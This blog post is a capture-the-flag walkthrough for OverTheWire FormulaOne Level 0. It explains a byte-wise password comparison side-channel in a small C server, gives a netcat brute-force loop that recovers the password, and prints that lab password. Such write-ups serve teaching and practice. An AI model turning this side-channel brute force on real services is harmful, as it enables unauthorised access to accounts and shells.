---
date: 2023-09-27 00:00:00 +0700
layout: post-with-comments
title: "OverTheWire FormulaOne Level 0 tutorial!!"
permalink: /posts/overTheWire-FormulaOne-Level-0/
tags: [overthewire, formulaone, pwn, binary-exploitation, linux, beginner]
description: "A step by step tutorial for OverTheWire FormulaOne Level 0!!"
---

<!-- Scoped styles: only affect this post -->
<style>
  .formulaone-nav{display:flex;align-items:center;gap:.75rem;margin:.5rem 0 1.25rem;border-top:1px solid var(--border-color,#3a3a3a);padding-top:.75rem}
  .formulaone-nav .nav-left,.formulaone-nav .nav-center,.formulaone-nav .nav-right{flex:1}
  .formulaone-nav .nav-left{text-align:left}
  .formulaone-nav .nav-center{text-align:center}
  .formulaone-nav .nav-right{text-align:right}
  .formulaone-nav a{display:inline-block;padding:.45rem .8rem;border:1px solid var(--border-color,#3a3a3a);border-radius:.6rem;text-decoration:none;line-height:1}
  .formulaone-nav a:hover{transform:translateY(-1px)}
  .formulaone-nav .disabled{opacity:.55}
  :root[data-theme='light'] .formulaone-nav a{border-color:rgba(0,0,0,.15)}
</style>

<nav class="formulaone-nav" aria-label="FormulaOne level navigation">
  <div class="nav-left">
    <span class="disabled">Previous: —</span>
  </div>

  <div class="nav-center">
    <a href="https://overthewire.org/wargames/formulaone/formulaone0.html" target="_blank" rel="noopener">
      Official Level 0 ↗
    </a>
  </div>

  <div class="nav-right">
    <a href="{{ '/posts/overTheWire-FormulaOne-Level-0-to-1/' | relative_url }}">
      Next: Level 0 → 1 →
    </a>
  </div>
</nav>

## Login

- **Final login for this level (FormulaOne):**
  ```bash
  ssh formulaone0@formulaone.labs.overthewire.org -p 2232
  # password (at time of writing): 2w9lMSElHLSu6PigGsugLYdKiLV9BH84
````

> ⚠️ Passwords can rotate; if the above doesn’t work, follow the Solution below to recover it again.

* You’ll see the standard OTW banner on success.

---

## Task

Find where **FormulaOne level 0** actually starts and retrieve the **correct password** for user `formulaone0`. The instructions hint it’s hosted on the same server as another OTW wargame — so we’ll begin there, analyze a provided C server, discover a side-channel, and extract the real password.

---

## A little bit of Theory

We first hop into **Bandit Level 0** to locate FormulaOne’s starting point and code.

### 1) Get into Bandit 0

```bash
ssh bandit0@bandit.labs.overthewire.org -p 2220
# password: bandit0
```

Navigate to the FormulaOne materials:

```bash
cd /formulaone/ && ls -la
```

You’ll find sources like `formulaone0.c`. Permissions let us read the code:

```bash
cat formulaone0.c
```

### 2) Read and understand the server

A simplified copy of the interesting parts (trimmed for clarity):

```c
#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <signal.h>

#define PORT 4091

int read_byte(int fd) {
  int ret;
  char buf = 0;
  ret = recv(fd, &buf, 1, 0);
  if(ret == 0) { printf("RECV FAIL :(\n"); return -1; }
  if(ret < 0) return 0;
  return buf & 0xff;
}

#ifndef PASSWD
#define PASSWD "s3cret"
#endif

void client(int fd) {
  int i = 0;
  send(fd, "Password: ", 10, 0);
  for(i = 0; i < strlen(PASSWD); i++){
    if( PASSWD[i] != read_byte(fd) ){
      break;
    }
  }

  if(i != strlen(PASSWD)) {
    send(fd, "WRONG PASSWORD\n", 15, 0);
    close(fd);
  } else {
    dup2(fd,0); dup2(fd,1); dup2(fd,2);
    system("/bin/sh");
    printf("system just closed\n");
  }
}

int main() {
  // createsocket(PORT) ... accept() ... fork() ... client()
}
```

**Key observations:**

* The server **listens on TCP port 4091** (locally).
* `read_byte()` reads **exactly one byte** from the client at a time.
* `client()` compares the i’th byte you send with `PASSWD[i]`.
* If any byte **doesn’t match**, it sends “WRONG PASSWORD” and **closes** the connection.
* If all bytes match, it gives you a shell (`/bin/sh`).

Although `PASSWD` defaults to `"s3cret"`, it’s typically **overridden at compile time**. So the real password is different.

**Why this is vulnerable (side-channel):**
Because the server closes the connection as soon as a byte is wrong, we can detect whether each next byte is correct by watching whether the connection **stays open** (good) or **closes immediately** (bad). That leaks the password **one character at a time**.

---

## Solution

### Step 0 — Confirm FormulaOne lives behind Bandit

The official hint says the start is “on the same server as another wargame.” From `bandit0`:

```bash
ssh bandit0@bandit.labs.overthewire.org -p 2220
# password: bandit0

cd /formulaone/
ls -la
cat formulaone0.c
```

We’ve just validated the code and found the local service on **port 4091**.

---

### Attempt #1 — Try the hardcoded default (`s3cret`)

Let’s connect with netcat and try the obvious:

```bash
# from the same host where the service runs:
nc localhost 4091
Password: s3cret
WRONG PASSWORD
```

Nope — as expected, the compile-time password isn’t the default.

---

### Attempt #2 — Buffer overflow?

No buffer overflow here: input is consumed **one byte at a time** via `recv(fd, &buf, 1, 0);`. There’s no contiguous buffer to overflow.

---

### The real bug — Byte-by-byte compare leaks progress

The loop:

```c
for (i = 0; i < strlen(PASSWD); i++) {
  if (PASSWD[i] != read_byte(fd)) break;
}
```

* Send a correct next byte → connection **stays open** → the server waits for the next byte.
* Send a wrong next byte → server prints **WRONG PASSWORD** and **closes**.

So we can brute-force the password **prefix** one character at a time.

---

### Crafting the exploit (interactive, simple)

We’ll guess from a reasonable charset and observe behavior. Start with a quick helper:

```bash
# characters we’ll try (tweak as needed)
characters='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

pwd=""

# try each candidate by appending one more char
for ch in $(echo "$characters" | fold -w1); do
  echo "trying: ${pwd}${ch}"
  # send the current guess WITHOUT newline
  echo -n "${pwd}${ch}" | nc localhost 4091
  # If the connection prints "WRONG PASSWORD" (and closes), ${ch} is wrong.
  # If it seems to "hang"/stay open (no immediate close), ${ch} is the correct next byte.
done
```

**How to use this practically:**

* Run the loop; when you find a character that **keeps the connection open** (no immediate “WRONG PASSWORD”), **append it to `pwd`** and repeat the loop for the **next position**.
* Keep going until the server drops you into a shell — that means **full password matched**.

> Tip: You can script the “hang detection” with `timeout` + exit codes to fully automate. But the manual/visual approach mirrors the learning purpose here.

---

### Result — The password we recovered

At the time of solving, the recovered password for `formulaone0` was:

```
2w9lMSElHLSu6PigGsugLYdKiLV9BH84
```

> ⚠️ This may change later. If it doesn’t work for you, just repeat the brute-force process above.

---

### Final — SSH into FormulaOne Level 0

Now that we have the password, log in to the actual game host:

```bash
ssh formulaone0@formulaone.labs.overthewire.org -p 2232
# password: 2w9lMSElHLSu6PigGsugLYdKiLV9BH84
```

Verify:

```bash
whoami   # should print: formulaone0
pwd      # confirm home directory
```

Exit when done:

```bash
exit
```

---

### Troubleshooting quick tips

* `Permission denied` → Passwords rotate. Re-derive it with the side-channel brute force.
* `Connection timed out` → Check firewall/VPN; correct port is **2232** for SSH to FormulaOne.
* `WRONG PASSWORD` over `nc` → Your next byte guess is wrong; try the next character.
* Charset misses symbols? Expand `characters` to include punctuation if needed.

---

**Congrats 🎉** You’ve understood and exploited a classic **byte-wise comparison side-channel**, recovered the real password, and accessed **FormulaOne Level 0**. On to **Level 0 → 1**!

---

## Thanks for reading!

Until next time — **Otsumachi!!** 💖☄️✨

![Cinema]({{ '/assets/images/advice/cinema.gif' | relative_url }})

